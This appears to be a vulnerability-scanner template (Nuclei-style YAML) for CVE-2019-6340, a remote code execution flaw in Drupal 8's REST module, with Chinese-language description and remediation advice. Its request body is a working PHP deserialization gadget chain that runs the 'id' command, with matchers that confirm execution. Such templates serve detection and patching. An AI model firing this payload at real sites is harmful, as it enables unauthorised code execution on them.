id: CVE-2019-6340
info:
  name: Drupal 8 core RESTful Web Services RCE
  author:
  - l0ne1y
  description: |-
    Drupal 远程代码执行漏洞
    在 8.5.11 之前的 Drupal 8.5.x 和 8.6.10 之前的 Drupal 8.6.x 中，某些字段类型无法正确清理来自非表单源的数据。在某些情况下，这可能会导致任意 PHP 代码执行。仅当满足以下条件之一时，站点才会受此影响：站点启用了 Drupal 8 核心 RESTful Web 服务（rest）模块并允许 PATCH 或 POST 请求，或者站点启用了另一个 Web 服务模块，例如 JSON :Drupal 8 中的 API，或 Drupal 7 中的服务或 RESTful Web 服务。
  severity: critical
  remediation: |
    官方修复建议：

    Drupal官方已经发布了最新版本，请受影响的用户尽快升级进行防护。

    暂时不便升级的用户，可以采取以下措施进行临时防护：

    用户可以禁用所有Web服务模块，或将Web服务器配置为不允许对Web服务资源进行PUT / PATCH / POST请求。

    请注意，Web服务资源可能在多个路径上可用，具体取决于服务器的配置。 对于Drupal 7，资源通常可通过路径（clean URL）和通过“q”查询参数获得。 对于Drupal 8，当使用index.php /作为前缀时，路径可能仍然有效。

    详细步骤及官方建议请参考Drupal官方通告：

    https://www.drupal.org/sa-core-2019-003

    临时修复建议：
    <br/>1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。<br/>2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - uid=
    - gid=
    - groups=
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/node/1?_format=hal_json'
  method: POST
  body: '{ "link": [ { "value": "link", "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:2:\"id\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
    } ], "_links": { "type": { "href": "http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default"
    } } }'
